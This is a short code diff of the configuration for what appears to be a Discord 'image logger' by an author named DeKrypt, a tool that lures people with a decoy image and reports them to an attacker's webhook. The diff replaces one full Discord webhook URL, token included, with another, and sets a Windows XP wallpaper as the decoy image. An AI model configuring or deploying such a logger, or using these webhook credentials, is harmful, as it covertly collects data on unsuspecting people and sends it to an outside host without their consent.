@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1073676404014723122/7WaojUcYefnVkSRI_A8q4pw1-UZIL9_PB3wSN2FRGIWMyxlf0bs-woV9BK020gxPr_4X",
-    "image": "https://logger-pied.vercel.app/", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1373239225759301723/oQTKCkteW1on1fbypARORVzSRKkpy6PEcbO_sIkkJ385ncWifCElXF1sCIFZ9gY46u5-",
+    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
